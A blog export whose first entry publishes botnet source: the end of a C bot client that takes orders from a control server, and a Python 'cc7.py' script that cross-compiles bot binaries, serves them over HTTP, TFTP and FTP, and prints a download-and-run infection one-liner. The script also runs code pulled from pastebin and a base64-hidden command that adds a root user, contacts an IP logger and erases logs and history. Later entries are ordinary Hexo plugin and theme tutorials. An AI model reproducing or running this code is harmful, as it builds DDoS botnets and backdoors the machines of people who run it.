prctl(PR_SET_NAME, (<span class="keyword">unsigned</span> <span class="keyword">long</span>) lolsuckmekid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        srand(time(<span class="literal">NULL</span>) ^ getpid());</span><br><span class="line">        init_rand(time(<span class="literal">NULL</span>) ^ getpid());</span><br><span class="line">        <span class="keyword">pid_t</span> pid1;</span><br><span class="line">        <span class="keyword">pid_t</span> pid2;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">		getOurIP();</span><br><span class="line">        <span class="keyword">if</span> (pid1 = fork()) &#123;</span><br><span class="line">                        waitpid(pid1, &amp;status, <span class="number">0</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid1) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (pid2 = fork()) &#123;</span><br><span class="line">                                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid2) &#123;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">		chdir(<span class="string">&quot;/&quot;</span>);	</span><br><span class="line">		setuid(<span class="number">0</span>);				</span><br><span class="line">		seteuid(<span class="number">0</span>);</span><br><span class="line">        signal(SIGPIPE, SIG_IGN);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(initConnection()) &#123; sleep(<span class="number">5</span>); <span class="keyword">continue</span>; &#125;</span><br><span class="line">				sockprintf(mainCommSock, <span class="string">&quot;\e[96m[%s] \e[97mConnected -&gt; %s -&gt; %s&quot;</span>,getBuildz(), inet_ntoa(ourIP), getBuild(), getEndianness(), VERSION);</span><br><span class="line">				UpdateNameSrvs();</span><br><span class="line">				RemoveTempDirs();</span><br><span class="line">				<span class="keyword">char</span> commBuf[<span class="number">4096</span>];</span><br><span class="line">                <span class="keyword">int</span> got = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>((got = recvLine(mainCommSock, commBuf, <span class="number">4096</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numpids; i++) <span class="keyword">if</span> (waitpid(pids[i], <span class="literal">NULL</span>, WNOHANG) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">int</span> *newpids, on;</span><br><span class="line">                                <span class="keyword">for</span> (on = i + <span class="number">1</span>; on &lt; numpids; on++) pids[on<span class="number">-1</span>] = pids[on];</span><br><span class="line">                                pids[on - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                                numpids--;</span><br><span class="line">                                newpids = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)<span class="built_in">malloc</span>((numpids + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>));</span><br><span class="line">                                <span class="keyword">for</span> (on = <span class="number">0</span>; on &lt; numpids; on++) newpids[on] = pids[on];</span><br><span class="line">                                <span class="built_in">free</span>(pids);</span><br><span class="line">                                pids = newpids;</span><br><span class="line">                        &#125;</span><br><span class="line">                        commBuf[got] = <span class="number">0x00</span>;</span><br><span class="line">                        trim(commBuf);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strstr</span>(commBuf, <span class="string">&quot;PING&quot;</span>) == commBuf) &#123; <span class="comment">// PING</span></span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strstr</span>(commBuf, <span class="string">&quot;DUP&quot;</span>) == commBuf) <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// DUP</span></span><br><span class="line">                        <span class="keyword">unsigned</span> <span class="keyword">char</span> *message = commBuf;</span><br><span class="line">                        <span class="keyword">if</span>(*message == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">char</span> *nickMask = message + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">while</span>(*nickMask != <span class="string">&#x27; &#x27;</span> &amp;&amp; *nickMask != <span class="number">0x00</span>) nickMask++;</span><br><span class="line">                                <span class="keyword">if</span>(*nickMask == <span class="number">0x00</span>) <span class="keyword">continue</span>;</span><br><span class="line">                                *(nickMask) = <span class="number">0x00</span>;</span><br><span class="line">                                nickMask = message + <span class="number">1</span>;</span><br><span class="line">                                message = message + <span class="built_in">strlen</span>(nickMask) + <span class="number">2</span>;</span><br><span class="line">                                <span class="keyword">while</span>(message[<span class="built_in">strlen</span>(message) - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span> || message[<span class="built_in">strlen</span>(message) - <span class="number">1</span>] == <span class="string">&#x27;\r&#x27;</span>) message[<span class="built_in">strlen</span>(message) - <span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">char</span> *command = message;</span><br><span class="line">                                <span class="keyword">while</span>(*message != <span class="string">&#x27; &#x27;</span> &amp;&amp; *message != <span class="number">0x00</span>) message++;</span><br><span class="line">                                *message = <span class="number">0x00</span>;</span><br><span class="line">                                message++;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">char</span> *tmpcommand = command;</span><br><span class="line">                                <span class="keyword">while</span>(*tmpcommand) &#123; *tmpcommand = <span class="built_in">toupper</span>(*tmpcommand); tmpcommand++; &#125;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">char</span> *params[<span class="number">10</span>];</span><br><span class="line">                                <span class="keyword">int</span> paramsCount = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">unsigned</span> <span class="keyword">char</span> *pch = strtok(message, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                                params[<span class="number">0</span>] = command;</span><br><span class="line">                                <span class="keyword">while</span>(pch) &#123;</span><br><span class="line">                                        <span class="keyword">if</span>(*pch != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                                                params[paramsCount] = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(pch) + <span class="number">1</span>);</span><br><span class="line">                                                <span class="built_in">memset</span>(params[paramsCount], <span class="number">0</span>, <span class="built_in">strlen</span>(pch) + <span class="number">1</span>);</span><br><span class="line">                                                <span class="built_in">strcpy</span>(params[paramsCount], pch);</span><br><span class="line">                                                paramsCount++;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        pch = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                processCmd(paramsCount, params);</span><br><span class="line">                                <span class="keyword">if</span>(paramsCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                                        <span class="keyword">int</span> q = <span class="number">1</span>;</span><br><span class="line">                                        <span class="keyword">for</span>(q = <span class="number">1</span>; q &lt; paramsCount; q++) &#123;</span><br><span class="line">                                                <span class="built_in">free</span>(params[q]);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  BASE Client Made by Wicked</span></span><br><span class="line"><span class="comment">//  SelfRep Goes Into telnet.txt (say thanks to Seclusion for that)</span></span><br><span class="line"><span class="comment">//  Attacks, Ranges &amp; Botkiller Improved by Scarface</span></span><br><span class="line"><span class="comment">//  Decent STD Flood By Scarface</span></span><br><span class="line"><span class="comment">//  Improved HTTP Flood By Scarface</span></span><br><span class="line"><span class="comment">//  Binarys &amp; Ranges Added By By Scarface</span></span><br></pre></td></tr></table></figure>


<h1 id="cc7-py"><a href="#cc7-py" class="headerlink" title="cc7.py"></a>cc7.py</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Python auto cross compiler by re4per</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess, urllib2, sys, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">2</span>]) != <span class="number">0</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1b[0;31mIncorrect Usage!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1b[0;32mUsage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; &lt;BOTNAME.C&gt; &lt;IPADDR&gt; \x1b[0m&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">bot = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">yourafag = raw_input(<span class="string">&quot;Get arch&#x27;s? Y/n:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> yourafag.lower() == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">    get_arch = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    get_arch = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">compileas = [<span class="string">&quot;ntpd&quot;</span>, <span class="comment">#mips</span></span><br><span class="line">             <span class="string">&quot;sshd&quot;</span>, <span class="comment">#mipsel</span></span><br><span class="line">             <span class="string">&quot;openssh&quot;</span>, <span class="comment">#sh4</span></span><br><span class="line">             <span class="string">&quot;bash&quot;</span>, <span class="comment">#x86</span></span><br><span class="line">             <span class="string">&quot;tftp&quot;</span>, <span class="comment">#Armv6l</span></span><br><span class="line">             <span class="string">&quot;wget&quot;</span>, <span class="comment">#i686</span></span><br><span class="line">             <span class="string">&quot;cron&quot;</span>, <span class="comment">#ppc</span></span><br><span class="line">             <span class="string">&quot;ftp&quot;</span>, <span class="comment">#i586</span></span><br><span class="line">             <span class="string">&quot;pftp&quot;</span>, <span class="comment">#m68k</span></span><br><span class="line">             <span class="string">&quot;sh&quot;</span>,</span><br><span class="line">			 <span class="string">&quot;[cpu]&quot;</span>,</span><br><span class="line">			 <span class="string">&quot;apache2&quot;</span>,</span><br><span class="line">			 <span class="string">&quot;telnetd&quot;</span>]</span><br><span class="line"></span><br><span class="line">getarch = [<span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ccs = [<span class="string">&quot;cross-compiler-mips&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-mipsel&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-sh4&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-x86_64&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-armv6l&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-i686&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-powerpc&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-i586&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-m68k&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-sparc&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-armv4l&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-armv5l&quot;</span>,</span><br><span class="line">       <span class="string">&quot;cross-compiler-powerpc-440fp&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    subprocess.call(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&quot;rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*&quot;</span>)</span><br><span class="line">rx = urllib2.urlopen(<span class="string">&quot;http://pastebin.com/raw/1wvLihk5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> get_arch == <span class="literal">True</span>:</span><br><span class="line">    run(<span class="string">&quot;rm -rf cross-compiler-*&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Downloading Architectures&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> arch <span class="keyword">in</span> getarch:</span><br><span class="line">        run(<span class="string">&quot;wget &quot;</span> + arch + <span class="string">&quot; --no-check-certificate &gt;&gt; /dev/null&quot;</span>)</span><br><span class="line">        run(<span class="string">&quot;tar -xvf *tar.bz2&quot;</span>)</span><br><span class="line">        run(<span class="string">&quot;rm -rf *tar.bz2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cross Compilers Downloaded...&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> cc <span class="keyword">in</span> ccs:</span><br><span class="line">    arch = cc.split(<span class="string">&quot;-&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    run(<span class="string">&quot;./&quot;</span>+cc+<span class="string">&quot;/bin/&quot;</span>+arch+<span class="string">&quot;-gcc -static -pthread -D&quot;</span> + arch.upper() + <span class="string">&quot; -o &quot;</span> + compileas[num] + <span class="string">&quot; &quot;</span> + bot + <span class="string">&quot; &gt; /dev/null&quot;</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cross Compiling Done!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Setting up your httpd and tftp&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&quot;yum install httpd -y&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;service httpd start&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;yum install xinetd tftp tftp-server -y&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;yum install vsftpd -y&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;service vsftpd start&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;&#x27;&#x27;echo -e &quot;# default: off</span></span><br><span class="line"><span class="string"># description: The tftp server serves files using the trivial file transfer \</span></span><br><span class="line"><span class="string">#       protocol.  The tftp protocol is often used to boot diskless \</span></span><br><span class="line"><span class="string">#       workstations, download configuration files to network-aware printers, \</span></span><br><span class="line"><span class="string">#       and to start the installation process for some operating systems.</span></span><br><span class="line"><span class="string">service tftp</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">        socket_type             = dgram</span></span><br><span class="line"><span class="string">        protocol                = udp</span></span><br><span class="line"><span class="string">        wait                    = yes</span></span><br><span class="line"><span class="string">        user                    = root</span></span><br><span class="line"><span class="string">        server                  = /usr/sbin/in.tftpd</span></span><br><span class="line"><span class="string">        server_args             = -s -c /var/lib/tftpboot</span></span><br><span class="line"><span class="string">        disable                 = no</span></span><br><span class="line"><span class="string">        per_source              = 11</span></span><br><span class="line"><span class="string">        cps                     = 100 2</span></span><br><span class="line"><span class="string">        flags                   = IPv4</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot; &gt; /etc/xinetd.d/tftp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">run(<span class="string">&quot;service xinetd start&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;&#x27;&#x27;echo -e &quot;listen=YES</span></span><br><span class="line"><span class="string">local_enable=NO</span></span><br><span class="line"><span class="string">anonymous_enable=YES</span></span><br><span class="line"><span class="string">write_enable=NO</span></span><br><span class="line"><span class="string">anon_root=/var/ftp</span></span><br><span class="line"><span class="string">anon_max_rate=2048000</span></span><br><span class="line"><span class="string">xferlog_enable=YES</span></span><br><span class="line"><span class="string">listen_address=&#x27;&#x27;&#x27;</span>+ ip +<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">listen_port=21&quot; &gt; /etc/vsftpd/vsftpd-anon.conf&#x27;&#x27;&#x27;</span>)</span><br><span class="line">run(<span class="string">&quot;service vsftpd restart&quot;</span>)</span><br><span class="line">getc = rx.read()</span><br><span class="line">getc = getc.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;echo -e \&quot;\x1b[30m\&quot;&quot;</span>)</span><br><span class="line">subprocess.call(getc,shell=<span class="literal">True</span>)</span><br><span class="line">run(<span class="string">&quot;echo -e \&quot;\x1b[37m\&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> compileas:</span><br><span class="line">    run(<span class="string">&quot;cp &quot;</span> + i + <span class="string">&quot; /var/www/html&quot;</span>)</span><br><span class="line">    run(<span class="string">&quot;cp &quot;</span> + i + <span class="string">&quot; /var/ftp&quot;</span>)</span><br><span class="line">    run(<span class="string">&quot;mv &quot;</span> + i + <span class="string">&quot; /var/lib/tftpboot&quot;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;#!/bin/bash&quot; &gt; /var/lib/tftpboot/tftp1.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;ulimit -n 1024&quot; &gt;&gt; /var/lib/tftpboot/tftp1.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;cp /bin/busybox /tmp/&quot; &gt;&gt; /var/lib/tftpboot/tftp1.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;#!/bin/bash&quot; &gt; /var/lib/tftpboot/tftp2.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;ulimit -n 1024&quot; &gt;&gt; /var/lib/tftpboot/tftp2.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;cp /bin/busybox /tmp/&quot; &gt;&gt; /var/lib/tftpboot/tftp2.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;#!/bin/bash&quot; &gt; /var/www/html/bins.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> compileas:</span><br><span class="line">    run(<span class="string">&#x27;echo -e &quot;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span> + i + <span class="string">&#x27;; chmod +x &#x27;</span> + i + <span class="string">&#x27;; ./&#x27;</span> + i + <span class="string">&#x27;; rm -rf &#x27;</span> + i + <span class="string">&#x27;&quot; &gt;&gt; /var/www/html/bins.sh&#x27;</span>)</span><br><span class="line">    run(<span class="string">&#x27;echo -e &quot;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 &#x27;</span> + ip + <span class="string">&#x27; &#x27;</span> + i + <span class="string">&#x27; &#x27;</span> + i + <span class="string">&#x27;; chmod 777 &#x27;</span> + i + <span class="string">&#x27; ./&#x27;</span> + i + <span class="string">&#x27;; rm -rf &#x27;</span> + i + <span class="string">&#x27;&quot; &gt;&gt; /var/ftp/ftp1.sh&#x27;</span>)</span><br><span class="line">    run(<span class="string">&#x27;echo -e &quot;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp &#x27;</span> + ip + <span class="string">&#x27; -c get &#x27;</span> + i + <span class="string">&#x27;;cat &#x27;</span> + i + <span class="string">&#x27; &gt;badbox;chmod +x *;./badbox&quot; &gt;&gt; /var/lib/tftpboot/tftp1.sh&#x27;</span>)</span><br><span class="line">    run(<span class="string">&#x27;echo -e &quot;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r &#x27;</span> + i + <span class="string">&#x27; -g &#x27;</span> + ip + <span class="string">&#x27;;cat &#x27;</span> + i + <span class="string">&#x27; &gt;badbox;chmod +x *;./badbox&quot; &gt;&gt; /var/lib/tftpboot/tftp2.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&quot;service xinetd restart&quot;</span>)</span><br><span class="line">run(<span class="string">&quot;service httpd restart&quot;</span>)</span><br><span class="line">run(<span class="string">&#x27;echo -e &quot;ulimit -n 99999&quot; &gt;&gt; ~/.bashrc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payld_str</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    subprocess.call(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">checkbinaries = <span class="string">&quot;dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIG15c3FsbDtlY2hvIC1lICJZdWhJc0JpZ0hha1xuWXVoSXNCaWdIYWsiIHwgcGFzc3dkIG15c3FsbDt3Z2V0IC1xTy0gImh0dHBzOi8vaXBsb2dnZXIub3JnLzFPY3J4IjtybSAtcmYgL3Zhci9sb2cvbGFzdGxvZztjZCAvcm9vdCA7IHJtIC1yZiAuYmFzaF9oaXN0b3J5O2hpc3RvcnkgLWM&quot;</span></span><br><span class="line">rebinaries = <span class="built_in">str</span>(base64.b64decode(checkbinaries))</span><br><span class="line">payld_str(rebinaries)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\x1b[0;32mSuccessfully cross compiled!\x1b[0m&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://&quot;</span> + ip + <span class="string">&quot;/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp &quot;</span> + ip + <span class="string">&quot; -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g &quot;</span> + ip + <span class="string">&quot;; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 &quot;</span> + ip + <span class="string">&quot; ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m&quot;</span>)</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\x1b[0;32mCoded By re4per\x1b[0m&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DDoS</category>
      </categories>
      <tags>
        <tag>SourceCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 安裝設置字數統計和預計閱讀時間</title>
    <url>/2021/12/11/hexo-plugins-symbols-count-time/</url>
    <content><![CDATA[<img src="/img/Post/image/Hexo/cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太擔心。</p>
<h1 id="關於插件"><a href="#關於插件" class="headerlink" title="關於插件"></a>關於插件</h1><p>呢個插件係用黎喺你文章入面顯示一啲文章既資訊 :</p>
<ul>
<li>文章字數統計顯示</li>
<li>文章閱讀時間顯示</li>
<li>網頁底部字數統計顯示</li>
<li>網頁底部閱讀時間顯示</li>
<li>顯示一分鐘閱讀字數</li>
</ul>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>安裝插件 hexo-symbols-count-time</p>
<blockquote>
<p>Github : <a href="https://github.com/willin/hexo-wordcount">https://github.com/willin/hexo-wordcount</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<h2 id="Hexo-config-yml-修改"><a href="#Hexo-config-yml-修改" class="headerlink" title="Hexo _config.yml 修改"></a>Hexo _config.yml 修改</h2><p>開 Hexo 內既 <code>_config.yml</code> 檔案 加以下呢段野 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span> <span class="comment"># 文章字數統計顯示</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span> <span class="comment"># 文章閱讀時間顯示</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">false</span> <span class="comment"># 網頁底部字數統計顯示</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">false</span> <span class="comment"># 網頁底部閱讀時間顯示</span></span><br><span class="line">  <span class="attr">exclude_codeblock:</span> <span class="literal">false</span> <span class="comment"># 字數統計是否排除程式碼</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span>  <span class="comment"># 平均文字長度，中文為 2, 英文為 5, 預設為 4</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span>  <span class="comment"># 一分鐘閱讀字數</span></span><br><span class="line">  <span class="attr">suffix:</span> <span class="string">&quot;分鐘&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Next-Themes-config-yml-修改"><a href="#Next-Themes-config-yml-修改" class="headerlink" title="Next Themes _config.yml 修改"></a>Next Themes _config.yml 修改</h2><p>開 Next Theme 內既 <code>_config.yml</code> 檔案 改做呢以下呢段野 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span> <span class="comment"># 是否獨立一行</span></span><br><span class="line">  <span class="comment"># 以下設定如果填 false，「文章字數：」與「所需閱讀時間 ≈ 」會以圖標呈現</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span> <span class="comment"># 文章</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span> <span class="comment"># 網頁底部</span></span><br></pre></td></tr></table></figure>

<h2 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h2><p>重開 server。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://guiblogs.com/hexo30-18/">https://guiblogs.com/hexo30-18/</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Themes - Next</title>
    <url>/2022/02/17/hexo-themes-next/</url>
    <content><![CDATA[<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-npm"></i> NPM Install</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-git-square"></i> Git Install</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote>
<p>npm 安裝唔會喺 themes folder，而會出現喺 node_modules</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-theme-next@latest</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><blockquote>
<p>推薦安裝方法 git</p>
</blockquote>
